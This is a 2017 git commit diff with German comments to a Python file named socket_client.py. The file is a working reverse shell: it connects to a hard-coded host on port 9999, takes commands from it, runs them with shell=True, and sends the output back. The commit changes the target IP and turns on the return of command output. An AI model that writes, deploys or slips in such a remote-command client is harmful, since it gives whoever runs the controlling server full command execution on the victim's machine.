cceb07bba25360bd621aefecfe0fb7e26546047f
Goeff888 <33512526+Goeff888@users.noreply.github.com>
2017-12-12 18:36:11 +0100

    socket_client sendet

--- socket_client.py
+++ socket_client.py
@@ -9,22 +9,22 @@ import os
 import subprocess
 
 s = socket.socket()
-host = '192.168.0.103'
+host = '192.168.0.105'
 port = 9999
 
 s.connect((host,port))
 
 while True:
     data = s.recv(1024)
-    s.send ('Helloo23')
+    #s.send ('Helloo23') #String in Byte verwandeln bevor er versendet wird
     if data[:2].decode("utf-8") == 'cd':
         os.chdir(data[3:].decode("utf-8"))
         
     if len(data) > 0:
-        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
+        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE) #gesendetes Kommando ausführen
         output_byte = cmd.stdout.read() + cmd.stderr.read()
         output_str = str(output_byte,"utf-8")
         currentWD = os.getcwd() +"> "
-        #s.send(str.encode(output_str + currentWD))
-        s.send ('Helloo')
+        s.send(str.encode(output_str + currentWD))
+        
         print(output_str)
